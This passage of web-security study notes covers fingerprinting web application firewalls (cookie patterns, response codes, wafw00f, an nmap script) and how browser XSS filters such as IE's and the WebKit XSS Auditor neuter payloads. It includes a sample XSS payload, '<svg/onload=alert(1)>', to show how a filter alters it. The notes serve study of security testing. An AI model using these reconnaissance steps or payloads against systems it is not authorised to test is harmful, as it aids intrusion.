+</code></pre><h2 id="f20303e1-e004-4f6f-ad54-b40cfb978645" class=""><strong>Detection and Fingerprinting</strong></h2><h3 id="0b2bb9df-6898-40c7-af8e-2ecb2d27e739" class=""><strong>Cookie Values</strong></h3><ul id="845f26ab-c910-47ef-bb86-b763242692d4" class="bulleted-list"><li style="list-style-type:disc">Citrix Netscaler uses some different cookies in the HTTP responses like <strong>ns_af</strong> or <strong>citrix_ns_id</strong> or <strong>NSC_</strong></li></ul><ul id="94781204-e71d-4638-9cc8-2e1470cfe9f3" class="bulleted-list"><li style="list-style-type:disc">F5 BIG-IP ASM (Application Security Manager) uses cookies starting with <strong>TS</strong> and followed with a string that respect the following regex:</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="99af724f-1440-4b34-94c0-adb41bb1e5f2" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">^TS[a-z-A-Z0-9]{3,6}
+</code></pre><ul id="0087f443-7839-4345-8208-656ca662a72c" class="bulleted-list"><li style="list-style-type:disc">Barracura uses two cookies <strong>barra_counter_session</strong> and <strong>BNI__BARRACUDA_LB_COOKIE</strong></li></ul><h3 id="1fdbc4c9-9098-4c7f-a082-107ccae0a353" class=""><strong>Header Rewrite</strong></h3><p id="243e8f31-d2f0-4024-b230-bff534a5729c" class="">Some WAFs rewrite the HTTP headers. Usually these modify the Server Header to deceive the attackers.</p><h3 id="d56156cf-09da-4287-9372-5c9b96b303a6" class=""><strong>HTTP Response Code</strong></h3><p id="32b7baa0-7ce4-4503-88e9-098256e116dd" class="">Some WAFs modify the HTTP response codes if the request is hostile; For example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4706cbfc-6114-4179-a706-0bcf017c47c4" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- mod_security       &gt; 406 Not Acceptable
+→ AQTRONIX WebKnight &gt; 999 No Hacking
+</code></pre><h3 id="21b6b73e-8287-4274-98ff-613d1075e70c" class=""><strong>HTTP Response Body</strong></h3><p id="c138a77b-970f-4157-b44a-c9c78921bddc" class="">its also possible to detect in the response body</p><p id="c6eaed2c-3d41-41b9-961c-6e142d9d0444" class="">Example:</p><table id="265118c8-9ebf-4f58-a3d6-2ae7d62daee6" class="simple-table"><tbody><tr id="74a16cfe-58d9-4bdd-b081-3d416bd4dc21"><td id="H&gt;dR" class="">&lt;body&gt;</td><td id="yA}:" class="">&lt;body&gt;</td></tr><tr id="58d46bf7-64fa-4968-8bd2-1c90e0e8c5b4"><td id="H&gt;dR" class="">…Mod_Security…</td><td id="yA}:" class="">…<strong>AQTRONIX WebKnight</strong> …</td></tr><tr id="a85b9a2f-2ee2-4c11-9168-eaebe0717ef6"><td id="H&gt;dR" class="">&lt;/body&gt;</td><td id="yA}:" class="">&lt;/body</td></tr></tbody></table><p id="a6f961ff-95b7-4451-bb78-ef37b7b65309" class=""><strong>dotDefender</strong> Blocked your Request</p><h3 id="12bf93ae-8aa6-4bde-ac16-af97c413afe4" class=""><strong>Close Connection</strong></h3><p id="ccb5b8dd-959e-46a2-a957-c27fbb145df9" class="">its useful in dropping the connection in the case the WAF detects a malicious request</p><ul id="fbffd513-c5a1-4ae6-833a-67da1a29ed4e" class="bulleted-list"><li style="list-style-type:disc">mod_security</li></ul><h3 id="f3ea172a-b8b2-4578-b142-d6377233444b" class=""><strong>Detect WAF</strong></h3><p id="03e85de6-77a9-4d52-86d8-0436167c3f81" class=""><strong>wafw00f</strong> is a tool written in python that can detect up to 20 different WAF products</p><ul id="4d5d9994-a286-4879-bd13-b886bc36b1b9" class="bulleted-list"><li style="list-style-type:disc">wafw00f - https://code.google.com/p/waffit/</li></ul><p id="15dd7bec-5e14-47c5-aaad-7a9a3d771330" class="">The techniques used to detect a WAF are similar to those we have seen previously:</p><ol type="1" id="31c1551d-0e4c-4e3e-9a92-4bc8122ebf3e" class="numbered-list" start="1"><li>Cookies</li></ol><ol type="1" id="c2215aed-f0a0-4c8d-9c22-e4769a35dccc" class="numbered-list" start="2"><li>Server Cloaking</li></ol><ol type="1" id="462006c5-043c-4b4a-a769-642f3578ba46" class="numbered-list" start="3"><li>Response Codes</li></ol><ol type="1" id="2a55a8c0-a6a7-44e7-813b-10216246c9f7" class="numbered-list" start="4"><li>Drop Action</li></ol><ol type="1" id="839c4964-54a9-47de-b5f8-83f2262b3f60" class="numbered-list" start="5"><li>Pre-Built-in Rules</li></ol><ul id="bfac700f-1d87-46c6-b51d-6cb7fcf9995d" class="bulleted-list"><li style="list-style-type:disc">Nmap contains a script that tries to detect the presence of a web application fireall, its type and version. http://nmap.org/nsedoc/scripts/http-waf-fingerprint.html</li></ul><p id="9f769edf-b4c0-4af2-b3d5-078edbe93abb" class="">→ nmap –script=http-waf-fingerprint -p 80</p><ul id="3189b834-a9bd-4b20-9ec0-9b99fbeaa7a2" class="bulleted-list"><li style="list-style-type:disc">imperva-detect = https://code.google.com/p/imperva-detect/</li></ul><h2 id="8bb36b08-45d6-4f54-ac1c-ab8778e31d19" class=""><strong>Client-Side Filters</strong></h2><p id="81b5f88c-0bcd-40f5-bfbd-255515d55d5d" class="">Browsers are the primary mean used to address client-side attacks</p><h3 id="f3690634-0f73-43bc-983e-bdbcc8450ba7" class=""><strong>Browser Add-ons</strong></h3><p id="ef91613e-f0c0-4748-8d53-dfa412ee6beb" class="">NoScript Security Suite is a whitelist-based security tool that basically disables all the executable web content (Javascript, Java, Flash, Silverlight, …) and lets the user choose which sites are <strong>trusted</strong>, thus allowing the use of these technologies.</p><p id="cdd82f8c-ebd4-40ea-b0d0-ade8ad703e2c" class="">→ https://addons.mozilla.org/en-US/firefox/addon/noscript/</p><ul id="4d0cb3de-f185-43f0-ad41-7cd3f3eda182" class="bulleted-list"><li style="list-style-type:disc">http://noscript.net/features#xss is effect browser-based solutions to prevent targeted malicious web attacks.</li></ul><h3 id="1f5e0079-8bf8-49d2-9516-5c6a29ba6308" class=""><strong>XSS Filter (IE)</strong></h3><p id="435a984f-c94e-492b-8d8c-5e09bfda109e" class="">c:\windows\system32\mshtml.dll library. Ways to inspect:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="21a0c6c7-6a07-4e4e-80b8-33d88c7f6366" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Hex editors like WinHex. Notepad++ with TextFX plugin
+# IDAPro
+# MS-DOS commands
+
+findstr /C:&quot;sc{r}&quot; \WINDOWS\SYSTEM32\mshtml.dll | find &quot;{&quot;
+&gt; savepath //u can save to a file For more readable results
+</code></pre><h3 id="b50836fd-7fbe-438d-9115-208023b79690" class=""><strong>Neutering in Action</strong></h3><p id="14cc55b8-21db-403d-b1d2-4c84e6b16946" class="">Basically, once a malicious injection is detected, the XSS Filter modified the evil part of the payload by adding the ‘#’ character in place of the neuter chracter, defined in the rules.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bffb9619-6a74-404f-be02-743341763f98" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">evil &gt; ev{i}l &gt; ev#l
+&lt;svg/onload=alert(1)&gt; = &lt;svg/#nload=alert(1)&gt;
+</code></pre><p id="80597d67-377b-43e0-a205-4675aa88eaa3" class="">Web sites that chose to opt-out of this protection can use the HTTP response header:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="3a92621c-ce3c-435e-a811-03320209ad5d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">X-XSS-Protection: 0
+X-XSS-Protection: 1; mode=block //instead of sanitize the page, will render a simple #
+# others browsers like safari, used the same scheme
+</code></pre><h3 id="5af47c84-c326-482c-8ad2-e6a9c48bb953" class=""><strong>XSS Auditor - WebKit/Blink</strong><strong><a href="https://johnermac.github.io/notes/ewptx/encoding/#xss-auditor---webkitblink"></a></strong></h3><ul id="e6caf9e3-9bef-4119-ad06-bdf713516710" class="bulleted-list"><li style="list-style-type:disc">http://www.adambarth.com/papers/2010/bates-barth-jackson.pdf</li></ul><ul id="bbd1749b-7f4a-449b-9d2f-2ece93d940f7" class="bulleted-list"><li style="list-style-type:disc">enabled by default in browsers such as: chrome, opera and safari</li></ul><p id="38854644-7560-442c-ae6f-84995eca0749" class="">THe filter analyzes both the inbound requests and the outbound. If, in the parsed HTML data, it finds executable code within the response, then it stops the script and generates a console alert similar to the following. <strong>The XSS Auditor refused to execute a script in …</strong></p></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
